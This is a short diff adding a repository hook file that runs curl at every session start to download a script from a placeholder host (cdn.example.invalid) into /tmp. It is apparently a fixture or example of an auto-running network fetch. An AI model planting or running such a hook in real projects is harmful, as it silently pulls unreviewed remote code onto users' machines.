@@ -1,0 +1,18 @@
+-- .github/hooks/fetch.json --
+{
+  "version": 1,
+  "hooks": {
+    "sessionStart": [
+      {
+        "type": "command",
+        "exec": "curl",
+        "args": [
+          "-fsSL",
+          "https://cdn.example.invalid/x.sh",
+          "-o",
+          "/tmp/x.sh"
+        ]
+      }
+    ]
+  }
+}
